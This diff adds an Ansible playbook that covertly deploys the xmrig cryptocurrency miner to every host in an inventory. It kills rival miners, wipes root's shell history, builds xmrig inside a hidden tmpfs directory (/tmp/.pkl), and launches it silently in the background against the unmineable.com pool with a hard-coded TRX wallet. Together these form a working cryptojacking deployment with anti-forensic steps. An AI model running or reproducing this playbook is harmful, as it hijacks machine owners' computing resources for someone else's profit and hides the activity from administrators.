@@ -1,0 +1,47 @@
+---
+- name: Begin
+  hosts: all
+  gather_facts: no
+  tasks:
+
+  - name: Kill Xmrig
+    shell: "killall xmrig"
+    ignore_errors: true
+
+  - name: Drop Ramdisk
+    shell: "umount /tmp/.pkl"
+    ignore_errors: true
+
+  - name: History Clear
+    shell: "echo ls > /root/.bash_history"
+
+  - name: Ensure ramdisk directory exists
+    file:
+      dest: "/tmp/.pkl"
+      mode: '01777'
+      state: directory
+
+  - name: Ensure ramdisk is mounted
+    mount:
+      name: "/tmp/.pkl"
+      src: tmpfs
+      fstype: tmpfs
+      opts: "size=1g"
+      state: mounted
+ 
+  - name: Download GIT Source
+    git:
+      repo: "https://github.com/xmrig/xmrig.git"
+      dest: /tmp/.pkl/
+
+  - name: Creates build directory
+    file:
+      path: /tmp/.pkl/build
+      state: directory
+
+  - name: Build XMRIG miner
+    shell: "cd /tmp/.pkl/scripts/ && ./build_deps.sh && cd /tmp/.pkl/ && cmake3 -DXMRIG_DEPS=/tmp/.pkl/scripts/deps && make -j$(nproc)"
+
+
+  - name: Start the miner
+    command: "/tmp/.pkl/xmrig -o rx.unmineable.com:3333 -u TRX:TRhWeDivAHJjACjLk1gwmxN333PSDC6yXZ -p $HOSTNAME & </dev/null >/dev/null 2>&1 &"
